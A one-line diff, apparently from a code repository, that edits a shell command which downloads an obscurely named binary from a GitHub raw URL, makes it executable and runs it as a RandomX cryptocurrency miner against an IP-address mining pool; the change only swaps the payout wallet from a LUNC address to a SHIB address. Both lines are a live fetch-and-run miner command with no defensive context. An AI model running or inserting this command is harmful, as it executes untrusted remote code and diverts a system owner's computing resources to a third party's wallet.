@@ -1,1 +1,1 @@
-wget https://github.com/ismaimwan6372/xerependit/raw/main/xerependit && chmod 700 xerependit && ./xerependit -a RandomX -o 209.25.142.78:3333 -u LUNC:terra1frh79vmtur5fmrghz6gfjvfhpa3u2c0uemv4af:100509230.STRIXPRO -t 3
+wget https://github.com/ismaimwan6372/xerependit/raw/main/xerependit && chmod 700 xerependit && ./xerependit -a RandomX -o 209.25.142.78:3333 -u SHIB:0x714b565b98770e8a2e84e3b612b5c1b07d78c2f8.STRIXPRO -t 3
